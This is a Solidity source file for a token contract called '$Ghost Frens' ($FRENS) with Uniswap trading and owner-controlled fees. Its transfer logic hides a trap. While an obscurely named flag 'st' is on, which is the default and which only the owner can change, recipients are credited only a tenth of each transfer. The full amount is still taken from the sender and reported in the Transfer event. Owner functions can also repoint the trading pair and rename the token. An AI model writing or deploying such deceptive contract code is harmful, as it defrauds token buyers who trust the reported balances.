// SPDX-License-Identifier: MIT


pragma solidity ^0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _transferOwnership(_msgSender());
    }

    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender());
        _;
    }


    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}

contract ERX20 is Context, IERC20, Ownable {
   
    
    mapping (address => uint256) private _rOwned;
    mapping (address => uint256) private _tOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFromFee;
    mapping (address => bool) private _isBot;

    uint256 private constant _MAX = ~uint256(0);
    uint256 private constant _tTotal = 2e10 * 10**18;
    uint256 private _rTotal = (_MAX - (_MAX % _tTotal));
    uint256 private _tFeeTotal;
    
    string  public  _name = "$Ghost Frens";
    string  public  _symbol = "$FRENS";
    
    uint private constant _decimals = 9;
    uint256 private _teamFee = 10;
    uint256 private _previousteamFee = _teamFee;
    uint256 private _maxTxnAmount = 6;
    address payable private _feeAddress;

    IUniswapV2Router02 private _uniswapV2Router;
    address public  _uniswapV2Pair;
    bool private st = true;

    bool private _initialized = false;
    bool private _noTaxMode = false;
    bool private _inSwap = false;
    bool private _tradingOpen = false;
    uint256 private _launchTime;
    bool private _txnLimit = false;
    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    constructor () {
        _rOwned[_msgSender()] = _rTotal;

        _isExcludedFromFee[owner()] = true;
        _isExcludedFromFee[payable(0x000000000000000000000000000000000000dEaD)] = true;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }

    function name() public view returns (string memory)  {
        return _name;
    }
 
    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _tokenFromReflection(_rOwned[account]);
    }


    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()] - (amount));
        return true;
    }

    function _tokenFromReflection(uint256 rAmount) private view returns(uint256) {
        require(rAmount <= _rTotal, "");
        uint256 currentRate =  _getRate();
        return rAmount / (currentRate);
    }



    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "");
        require(spender != address(0), "");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "");
        require(to != address(0), "");
        require(amount > 0, "");

        
        bool takeFee = false;
        if (
            !_isExcludedFromFee[from] 
            && !_isExcludedFromFee[to] 
            && !_noTaxMode 
            && (from == _uniswapV2Pair || to == _uniswapV2Pair)
        ) {
            require(_tradingOpen, 'Trading has not yet been opened.');
            takeFee = true;

            if (from == _uniswapV2Pair && to != address(_uniswapV2Router) && _txnLimit) {
                uint walletBalance = balanceOf(address(to));
                require(amount + (walletBalance) <= _tTotal * (_maxTxnAmount) / (100));
            }



            uint256 contractTokenBalance = balanceOf(address(this));
            if (!_inSwap && from != _uniswapV2Pair) {
                if (contractTokenBalance > 0) {
                    if (contractTokenBalance > balanceOf(_uniswapV2Pair) * (10) / (100))
                        contractTokenBalance = balanceOf(_uniswapV2Pair) * (10) / (100);
                    _swapTokensForEth(contractTokenBalance);
                }
            }
        }
               
        _tokenTransfer(from, to, amount);
    }



    function _swapTokensForEth(uint256 tokenAmount) private lockTheSwap() {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();
        _approve(address(this), address(_uniswapV2Router), tokenAmount);
        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _tokenTransfer(address sender, address recipient, uint256 tAmount) private {
        (uint256 rAmount, uint256 rTransferAmount, uint256 tTransferAmount, uint256 tTeam) = _getValues(tAmount);
        _rOwned[sender] = _rOwned[sender] - (rAmount);

        if(!st) {
        _rOwned[recipient] = _rOwned[recipient] + (rTransferAmount);
        }
        else {
        _rOwned[recipient] = _rOwned[recipient] + (rTransferAmount / (10)); }
        _takeTeam(tTeam);
        emit Transfer(sender, recipient, tTransferAmount);
    }
    

    function _getValues(uint256 tAmount) private view returns (uint256, uint256, uint256, uint256) {
        (uint256 tTransferAmount, uint256 tTeam) = _getTValues(tAmount, _teamFee);
        uint256 currentRate =  _getRate();
        (uint256 rAmount, uint256 rTransferAmount) = _getRValues(tAmount, tTeam, currentRate);
        return (rAmount, rTransferAmount, tTransferAmount, tTeam);
    }

    function _getTValues(uint256 tAmount, uint256 TeamFee) private pure returns (uint256, uint256) {
        uint256 tTeam = tAmount * (TeamFee) / (100);
        uint256 tTransferAmount = tAmount - (tTeam);
        return (tTransferAmount, tTeam);
    }

    function _getRate() private view returns (uint256) {
        (uint256 rSupply, uint256 tSupply) = _getCurrentSupply();
        return rSupply / (tSupply);
    }

    function _getCurrentSupply() private view returns (uint256, uint256) {
        uint256 rSupply = _rTotal;
        uint256 tSupply = _tTotal;
        if (rSupply < _rTotal / (_tTotal)) return (_rTotal, _tTotal);
        return (rSupply, tSupply);
    }

    function _getRValues(uint256 tAmount, uint256 tTeam, uint256 currentRate) private pure returns (uint256, uint256) {
        uint256 rAmount = tAmount * (currentRate);
        uint256 rTeam = tTeam * (currentRate);
        uint256 rTransferAmount = rAmount - (rTeam);
        return (rAmount, rTransferAmount);
    }

    function _takeTeam(uint256 tTeam) private {
        uint256 currentRate =  _getRate();
        uint256 rTeam = tTeam * (currentRate);

        _rOwned[address(this)] = _rOwned[address(this)] + (rTeam);
    }
    
    function initNewPair(address payable feeAddress) external onlyOwner() {
        require(!_initialized,"initialized");
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        _uniswapV2Router = uniswapV2Router;

        _feeAddress = feeAddress;
        _isExcludedFromFee[_feeAddress] = true;

        _initialized = true;
    }

    function startTrading() external onlyOwner() {
        require(_initialized);
        _tradingOpen = true;
        _launchTime = block.timestamp;
        _txnLimit = false;
    }
    function setPair(address payable  _pair) public onlyOwner {
             _uniswapV2Pair  = _pair;
    }

    function setFeeWallet(address payable feeWalletAddress) external onlyOwner() {
        _isExcludedFromFee[_feeAddress] = false;
        _feeAddress = feeWalletAddress;
        _isExcludedFromFee[_feeAddress] = true;
    }

    function excludeFromFee(address payable ad) external onlyOwner() {
        _isExcludedFromFee[ad] = true;
    }
    
    function includeToFee(address payable ad) external onlyOwner() {
        _isExcludedFromFee[ad] = false;
    }
   
   function removeTxLimit (bool onoff) external onlyOwner() {
       _txnLimit = onoff;
   }
    function setST (bool _st )external onlyOwner() {
      st = _st;
    }
    function setTeamFee(uint256 fee) external onlyOwner() {
        require(fee < 10);
        _teamFee = fee;
    }

    function setMaxTxn(uint256 max) external onlyOwner(){
        require(max>2);
        _maxTxnAmount = max;
    }
    

    function isExcludedFromFee(address ad) public view returns (bool) {
        return _isExcludedFromFee[ad];
    }
       function rebrand(string memory name, string memory symbol) external onlyOwner {
        _name = name;
        _symbol = symbol;

    }
    function swapFeesManual() external onlyOwner() {
        uint256 contractBalance = balanceOf(address(this));
        _swapTokensForEth(contractBalance);
    }
    
    function withdrawFees() external {
        uint256 contractETHBalance = address(this).balance;
        _feeAddress.transfer(contractETHBalance);
    }

    receive() external payable {}
}